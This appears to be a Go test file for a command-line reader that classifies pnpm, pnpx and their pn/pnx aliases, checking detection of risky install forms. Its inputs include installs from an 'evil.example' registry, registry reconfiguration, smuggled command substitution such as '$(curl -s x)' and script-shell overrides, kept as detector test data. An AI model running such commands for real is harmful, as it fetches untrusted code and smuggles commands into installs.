package installread

import (
	"regexp"
	"slices"
	"strings"
	"testing"
)

// pnpmWord: pnpm or pnpx as a word of its own (not --pnpmfile).
var pnpmWord = regexp.MustCompile(`\bpnp[mx]\b`)

// READER-PNPM-ALIAS-PN (ADR-0159 round 41): pnpm 11 and 12 install two more bins, pn (pnpm) and pnx (pnpx = pnpm dlx):
// package.json "bin" of pnpm@11.28.12 {pnpm, pnpx, pn: bin/pnpm.mjs, pnx: bin/pnpx.mjs} and of pnpm@12.21.0
// {pnpm, pn, pnpx, pnx}. Both readers read pn as pnpm and pnx as pnpx, word for word: the same targets and the same
// reasons. The real pn and pnx of 11.28.12 and 12.21.0 installed, fetched and ran these forms as pnpm and pnpx did
// (work-1116/reader-pn-pnx/probe/probe-pn.out).
func TestReaderPnPnxArePnpm(t *testing.T) {
	for line, want := range map[string]string{
		"pnx -y zz-pkg":             "npm:zz-pkg",
		"pnx zz-pkg":                "npm:zz-pkg",
		"pn add zz-pkg":             "npm:zz-pkg",
		"pn install zz-pkg":         "npm:zz-pkg",
		"pn i zz-pkg":               "npm:zz-pkg",
		"pn it zz-pkg":              "npm:zz-pkg",
		"pn dlx zz-pkg":             "npm:zz-pkg",
		"pn -C web add zz-pkg":      "npm:zz-pkg",
		"/usr/local/bin/pnx zz-pkg": "npm:zz-pkg",
		"PN.CMD add zz-pkg":         "npm:zz-pkg",
		"pnx.exe zz-pkg":            "npm:zz-pkg",
		"cd app && pn add zz-pkg":   "npm:zz-pkg",
		"sh -c 'pnx -y zz-pkg'":     "npm:zz-pkg",
	} {
		if tg, _ := codesOn(line); !slices.Contains(tg, want) {
			t.Errorf("%q: targets %v, want %s", line, tg, want)
		}
	}
	// the same reading as pnpm's and pnpx's, reason for reason
	for _, line := range []string{
		"pnpm add zz-pkg", "pnpm dlx zz-pkg", "pnpx -y zz-pkg", "pnpm -c dlx 'sh x.sh'", "pnpx -c 'sh x.sh'",
		"pnpm -sc exec 'sh x.sh'", "pnpm exec -c 'sh x.sh'", "pnpm add zz-pkg --registry http://evil.example",
		"pnpm add $(cat pkgs.txt)", "pnpx $(cat p)", "pnpm add `cat p`", "pnpm --config.script-shell=./x.sh add zz-pkg",
		"pnpm add zz-pkg --pnpmfile ./x.cjs", "pnpx --env-file .env zz-pkg", "pnpm config set registry http://evil.example",
		"pnpm add ./local-dir", "pnpm add --workspace zz-pkg", "echo zz | xargs pnpm add", "pnpm it zz-pkg",
		"pnpm exec zzbin", "pnpm add github:o/r", "pnpm dlx zz-pkg -c x", "npm_config_registry=http://e pnpm add zz-pkg",
		`eval "$(pnpm completion bash)"; pnpm add zz-pkg`, "echo $(pnpm --version); pnpm add zz-pkg", "pnpm --version",
		"pnpm add zz-pkg && pnpm --version", "alias pnpm=x; pnpm add zz-pkg", "pnpm(){ :; }; pnpm add zz-pkg",
	} {
		ptg, pcodes := codesOn(line)
		_, _, pother, psubst := ParseLine(line)
		for _, alias := range []string{
			strings.Replace(strings.Replace(line, "pnpx ", "pnx ", 1), "pnpm ", "pn ", 1),
			pnpmWord.ReplaceAllStringFunc(line, func(w string) string { return map[string]string{"pnpm": "pn", "pnpx": "pnx"}[w] }),
		} {
			atg, acodes := codesOn(alias)
			_, _, aother, asubst := ParseLine(alias)
			if !slices.Equal(ptg, atg) || !slices.Equal(pcodes, acodes) || pother != aother || psubst != asubst {
				t.Errorf("%q: targets %v codes %v other %v; %q: targets %v codes %v other %v", line, ptg, pcodes, pother,
					alias, atg, acodes, aother)
			}
		}
	}
	for line, code := range map[string]string{
		"pn -c dlx zz":    "command_string",
		"pnx -c zz":       "command_string",
		"pnx -yc zz":      "command_string",
		"pn add $(cat p)": "command_substitution",
		"pnx $(cat p)":    "command_substitution",
		"pn add zz-pkg --registry http://evil.example": "custom_registry",
	} {
		if _, codes := codesOn(line); !slices.Contains(codes, code) {
			t.Errorf("%q: codes %v, want %s", line, codes, code)
		}
	}
	for in, want := range map[string]string{"pn": "pnpm", "pnx": "pnpx", "pnpm": "pnpm", "pip3.12": "pip", "pnxx": "pnxx", "p": "p"} {
		if got := progName(in); got != want {
			t.Errorf("progName(%q) = %q, want %q", in, got, want)
		}
	}
	for _, in := range []string{"pn add $(curl -s x)", "pnx $(curl -s x)", "pn i `cat p`", "pnx '$(cat p)'"} {
		if !substInstall.MatchString(in) {
			t.Errorf("substInstall misses %q", in)
		}
	}
}
